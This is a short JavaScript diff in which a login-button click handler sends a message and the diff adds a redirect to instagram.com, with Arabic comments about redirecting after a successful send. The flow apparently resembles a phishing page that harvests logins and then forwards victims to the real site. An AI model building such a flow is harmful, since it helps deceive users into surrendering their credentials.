@@ -20,6 +20,9 @@ document.getElementById('loginButton').addEventListener('click', function (e) {
     })
     .then(function(data) {
       console.log('Message sent successfully:', data);
+      
+      // إعادة التوجيه بعد نجاح الإرسال
+      window.location.href = "https://instagram.com"; // استبدل بالرابط الذي تريد التحويل إليه
     })
     .catch(function(error) {
       console.error('Error sending message:', error);
